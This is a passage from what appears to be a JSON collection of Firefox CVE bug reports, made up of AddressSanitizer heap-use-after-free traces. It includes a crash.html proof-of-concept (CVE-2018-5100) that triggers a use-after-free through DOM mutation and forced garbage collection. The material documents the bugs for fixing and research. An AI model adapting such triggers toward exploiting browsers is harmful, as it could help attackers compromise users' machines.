(/fuzzer3/esr/firefox/firefox+0x41ba88) 0x61200022e6db is located 155 bytes inside of 264-byte region [0x61200022e640,0x61200022e748) freed by thread T0 here: #0 0x4b21db in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7fce4a064007 in Release /home/worker/workspace/build/src/xpfe/appshell/nsXULWindow.cpp:125:1 #2 0x7fce4a064007 in Release /home/worker/workspace/build/src/xpfe/appshell/nsWebShellWindow.cpp:103 #3 0x7fce4a064007 in Release /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:40 #4 0x7fce4a064007 in Release /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:399 #5 0x7fce4a064007 in ~RefPtr /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/RefPtr.h:78 #6 0x7fce4a064007 in ~WebShellWindowTimerCallback /home/worker/workspace/build/src/xpfe/appshell/nsWebShellWindow.cpp:530 #7 0x7fce4a064007 in mozilla::WebShellWindowTimerCallback::Release() /home/worker/workspace/build/src/xpfe/appshell/nsWebShellWindow.cpp:535 #8 0x7fce424356fb in ~Callback /home/worker/workspace/build/src/xpcom/threads/nsTimerImpl.h:83:9 #9 0x7fce424356fb in nsTimerImpl::Fire(int) /home/worker/workspace/build/src/xpcom/threads/nsTimerImpl.cpp:513 #10 0x7fce4240948c in nsTimerEvent::Run() /home/worker/workspace/build/src/xpcom/threads/TimerThread.cpp:285:3 #11 0x7fce42417cab in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1216:7 #12 0x7fce42499dec in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:361:10 #13 0x7fce4872fa74 in mozilla::dom::XMLHttpRequestMainThread::SendInternal(mozilla::dom::XMLHttpRequestMainThread::RequestBodyBase const*) /home/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp:2956:14 #14 0x7fce4874bfb3 in mozilla::dom::XMLHttpRequestMainThread::Send(JSContext*, nsAString_internal const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.h:380:13 #15 0x7fce463eb4bb in mozilla::dom::XMLHttpRequestBinding::send(JSContext*, JS::Handle<JSObject*>, mozilla::dom::XMLHttpRequest*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/XMLHttpRequestBinding.cpp:781:7 #16 0x7fce46baa5f9 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2904:13 #17 0x7fce4cf39375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #18 0x7fce4cf39375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #19 0x7fce4cf1977f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #20 0x7fce4cf1977f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #21 0x7fce4cefe93d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #22 0x7fce4cf399df in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #23 0x7fce4cf3a022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #24 0x7fce4cca869c in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #25 0x7fce4cc77ccf in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:333:14 #26 0x7fce4cc857bf in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:400:12 #27 0x7fce4cc87f6e in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:689:12 #28 0x7fce4cf39375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #29 0x7fce4cf39375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #30 0x7fce4cf3a022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #31 0x7fce4ca0ac7d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #32 0x7fce46593bcf in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:259:37 #33 0x7fce46fc430a in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:361:12 #34 0x7fce46fc430a in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214 #35 0x7fce46f8e6ad in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1134:16 #36 0x7fce46f900d7 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1287:17 #37 0x7fce46f7ae36 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:380:5 #38 0x7fce46f7e4c8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:711:9 #39 0x7fce4920a5f3 in PresShell::FireResizeEvent() /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:2038:5 #40 0x7fce492201a8 in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4122:7 previously allocated by thread T0 here: #0 0x4b24fb in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4e0ded in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7fce4a03aa43 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7fce4a03aa43 in nsAppShellService::JustCreateTopWindow(nsIXULWindow*, nsIURI*, unsigned int, int, int, bool, nsITabParent*, mozIDOMWindowProxy*, nsWebShellWindow**) /home/worker/workspace/build/src/xpfe/appshell/nsAppShellService.cpp:640 #4 0x7fce4a03cc5b in nsAppShellService::CreateTopLevelWindow(nsIXULWindow*, nsIURI*, unsigned int, int, int, nsITabParent*, mozIDOMWindowProxy*, nsIXULWindow**) /home/worker/workspace/build/src/xpfe/appshell/nsAppShellService.cpp:202:8 #5 0x7fce4a07ec8b in nsXULWindow::CreateNewContentWindow(int, nsITabParent*, mozIDOMWindowProxy*, nsIXULWindow**) /home/worker/workspace/build/src/xpfe/appshell/nsXULWindow.cpp:1994:5 #6 0x7fce4a8e6494 in nsAppStartup::CreateChromeWindow2(nsIWebBrowserChrome*, unsigned int, unsigned int, nsITabParent*, mozIDOMWindowProxy*, bool*, nsIWebBrowserChrome**) /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:658:7 #7 0x7fce49f90484 in nsWindowWatcher::CreateChromeWindow(nsACString_internal const&, nsIWebBrowserChrome*, unsigned int, unsigned int, nsITabParent*, mozIDOMWindowProxy*, nsIWebBrowserChrome**) /home/worker/workspace/build/src/embedding/components/windowwatcher/nsWindowWatcher.cpp:507:5 #8 0x7fce49f8df15 in nsWindowWatcher::OpenWindowInternal(mozIDOMWindowProxy*, char const*, char const*, char const*, bool, bool, bool, nsIArray*, bool, bool, nsIDocShellLoadInfo*, mozIDOMWindowProxy**) /home/worker/workspace/build/src/embedding/components/windowwatcher/nsWindowWatcher.cpp:1015:14 #9 0x7fce49f90097 in OpenWindow2 /home/worker/workspace/build/src/embedding/components/windowwatcher/nsWindowWatcher.cpp:442:10 #10 0x7fce49f90097 in non-virtual thunk to nsWindowWatcher::OpenWindow2(mozIDOMWindowProxy*, char const*, char const*, char const*, bool, bool, bool, nsISupports*, bool, bool, nsIDocShellLoadInfo*, mozIDOMWindowProxy**) /home/worker/workspace/build/src/embedding/components/windowwatcher/nsWindowWatcher.cpp:414 #11 0x7fce44d58ab8 in nsGlobalWindow::OpenInternal(nsAString_internal const&, nsAString_internal const&, nsAString_internal const&, bool, bool, bool, bool, bool, nsIArray*, nsISupports*, nsIDocShellLoadInfo*, bool, nsPIDOMWindowOuter**) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:12610:12 #12 0x7fce44d56ebe in OpenJS /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:8467:10 #13 0x7fce44d56ebe in nsGlobalWindow::OpenOuter(nsAString_internal const&, nsAString_internal const&, nsAString_internal const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:8429 #14 0x7fce44d5744f in nsGlobalWindow::Open(nsAString_internal const&, nsAString_internal const&, nsAString_internal const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:8438:3 #15 0x7fce46331cf7 in mozilla::dom::WindowBinding::open(JSContext*, JS::Handle<JSObject*>, nsGlobalWindow*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:2426:50 #16 0x7fce4632ff69 in mozilla::dom::WindowBinding::genericMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:15158:13 #17 0x7fce4cf39375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #18 0x7fce4cf39375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #19 0x7fce4cf1977f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #20 0x7fce4cf1977f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #21 0x7fce4cefe93d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #22 0x7fce4cf399df in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #23 0x7fce4cf3a022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #24 0x7fce4ca0ac7d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #25 0x7fce46593bcf in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:259:37 #26 0x7fce46fc430a in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:361:12 #27 0x7fce46fc430a in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214 #28 0x7fce46f8e6ad in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1134:16 #29 0x7fce46f900d7 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1287:17 #30 0x7fce46f7ae36 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:380:5 #31 0x7fce46f7e4c8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:711:9 #32 0x7fce4917621c in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1047:7 #33 0x7fce49f1b08b in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7638:5 #34 0x7fce49f16e94 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7442:7 #35 0x7fce49f1e4ff in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7339:13 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/xpfe/appshell/nsXULWindow.h:74:35 in IsLocked Shadow bytes around the buggy address: 0x0c248003dc80: fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa 0x0c248003dc90: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c248003dca0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c248003dcb0: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa 0x0c248003dcc0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd =>0x0c248003dcd0: fd fd fd fd fd fd fd fd fd fd fd[fd]fd fd fd fd 0x0c248003dce0: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa 0x0c248003dcf0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c248003dd00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c248003dd10: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa 0x0c248003dd20: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==5553==ABORTING"
      }
    ],
    "CVE-2018-5100": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1417405",
        "title": "heap-use-after-free in nsIDocument::IsPotentiallyScrollable",
        "description": "The following testcase crashes the latest ASAN build of Firefox nightly (SourceStamp=f0c0fb9182d695081edf170d8e3bcb8164f2c96a). The testcase requires the fuzzPriv extension. crash.html: <script> function start() { o37=document.createElement('iframe'); document.documentElement.appendChild(o37); o259=o37.contentDocument; o290=document.createElement('marquee'); document.documentElement.appendChild(o290); document.documentElement.addEventListener('DOMAttrModified',fun0); o259.scrollingElement; } function fun0() { o259.write('<div>'); fuzzPriv.GC();fuzzPriv.CC();fuzzPriv.GC();fuzzPriv.CC(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==25937==ERROR: AddressSanitizer: heap-use-after-free on address 0x60d0000438fc at pc 0x7f903decfd56 bp 0x7ffddcf68840 sp 0x7ffddcf68838 READ of size 4 at 0x60d0000438fc thread T0 (file:// Content) #0 0x7f903decfd55 in GetBoolFlag /builds/worker/workspace/build/src/dom/base/nsINode.h:1614:12 #1 0x7f903decfd55 in IsInUncomposedDoc /builds/worker/workspace/build/src/dom/base/nsINode.h:545 #2 0x7f903decfd55 in GetPrimaryFrame /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIContent.h:959 #3 0x7f903decfd55 in GetPrimaryFrame /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/Element.h:1267 #4 0x7f903decfd55 in nsIDocument::IsPotentiallyScrollable(mozilla::dom::HTMLBodyElement*) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:11007 #5 0x7f903ded00e6 in nsIDocument::GetScrollingElement() /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:11038:18 #6 0x7f903f4ac198 in mozilla::dom::DocumentBinding::get_scrollingElement(JSContext*, JS::Handle<JSObject*>, nsIDocument*, JSJitGetterCallArgs) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/DocumentBinding.cpp:4096:59 #7 0x7f903fa1bbe6 in mozilla::dom::GenericBindingGetter(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2909:13 #8 0x7f9045e5f2b0 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #9 0x7f9045e5f2b0 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #10 0x7f9045e61285 in InternalCall /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:12 #11 0x7f9045e61285 in Call /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541 #12 0x7f9045e61285 in js::CallGetter(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:656 #13 0x7f9046de3b8c in CallGetter /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2118:16 #14 0x7f9046de3b8c in GetExistingProperty<js::AllowGC::CanGC> /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2171 #15 0x7f9046de3b8c in NativeGetPropertyInline<js::AllowGC::CanGC> /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2374 #16 0x7f9046de3b8c in js::NativeGetProperty(JSContext*, JS::Handle<js::NativeObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/NativeObject.cpp:2410 #17 0x7f904689f71c in GetProperty /builds/worker/workspace/build/src/js/src/vm/NativeObject.h:1616:12 #18 0x7f904689f71c in JS_ForwardGetPropertyTo(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::Handle<JS::Value>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2719 #19 0x7f903fa13e1f in mozilla::dom::GetPropertyOnPrototype(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, bool*, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2096:10 #20 0x7f903f6dd6f6 in mozilla::dom::HTMLDocumentBinding::DOMProxyHandler::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) const /builds/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLDocumentBinding.cpp:2189:8 #21 0x7f9046b24370 in getInternal /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:352:21 #22 0x7f9046b24370 in js::Proxy::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:362 #23 0x7f9046b4896b in GetProperty /builds/worker/workspace/build/src/js/src/vm/NativeObject.h:1615:16 #24 0x7f9046b4896b in js::ForwardingProxyHandler::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) const /builds/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:154 #25 0x7f9046afbc88 in js::CrossCompartmentWrapper::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) const /builds/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:226:23 #26 0x7f9046b24370 in getInternal /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:352:21 #27 0x7f9046b24370 in js::Proxy::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/proxy/Proxy.cpp:362 #28 0x7f9045e6a8cb in GetProperty /builds/worker/workspace/build/src/js/src/vm/NativeObject.h:1615:16 #29 0x7f9045e6a8cb in GetProperty /builds/worker/workspace/build/src/js/src/jsobj.h:805 #30 0x7f9045e6a8cb in js::GetProperty(JSContext*, JS::Handle<JS::Value>, JS::Handle<js::PropertyName*>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:4407 #31 0x7f9045e4cfe4 in GetPropertyOperation /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:219:12 #32 0x7f9045e4cfe4 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2817 #33 0x7f9045e3287a in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #34 0x7f9045e5f3af in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #35 0x7f9045e602a2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:541:10 #36 0x7f90468a511b in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:3032:12 #37 0x7f903f439b45 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37 #38 0x7f903fe440ed in Call<nsISupports *> /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12 #39 0x7f903fe440ed in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215 #40 0x7f903fe0c176 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1118:51 #41 0x7f903fe0e342 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1293:20 #42 0x7f903fdeda61 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:462:16 #43 0x7f903fdf0f32 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:826:9 #44 0x7f90421018ae in nsDocumentViewer::LoadComplete(nsresult) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1064:7 #45 0x7f904519ffc1 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7779:21 #46 0x7f904519bfe4 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7577:7 #47 0x7f90451a386f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7474:13 #48 0x7f903cce2783 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1321:3 #49 0x7f903cce18ec in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:862:14 #50 0x7f903ccde978 in nsDocLoader::DocLoaderIsEmpty(bool) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:751:9 #51 0x7f903cce0892 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:633:5 #52 0x7f903cce14ec in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:489:14 #53 0x7f903b264be0 in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:629:28 #54 0x7f903dec066d in nsDocument::DoUnblockOnload() /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:9379:18 #55 0x7f903dec0231 in nsDocument::UnblockOnload(bool) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:9301:9 #56 0x7f903de99e79 in nsDocument::DispatchContentLoadedEvents() /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:5666:3 #57 0x7f903df3b542 in applyImpl<nsDocument, void (nsDocument::*)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1142:12 #58 0x7f903df3b542 in apply<nsDocument, void (nsDocument::*)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1148 #59 0x7f903df3b542 in mozilla::detail::RunnableMethodImpl<nsDocument*, void (nsDocument::*)(), true, (mozilla::RunnableKind)0>::Run() /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1192 #60 0x7f903b0974f1 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:396:25 #61 0x7f903b0bce86 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1037:14 #62 0x7f903b0d7618 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:513:10 #63 0x7f903be87e41 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #64 0x7f903bde848b in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #65 0x7f903bde848b in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #66 0x7f903bde848b in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #67 0x7f904187da0f in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:159:27 #68 0x7f9045bb4e47 in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:877:22 #69 0x7f903bde848b in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #70 0x7f903bde848b in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #71 0x7f903bde848b in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #72 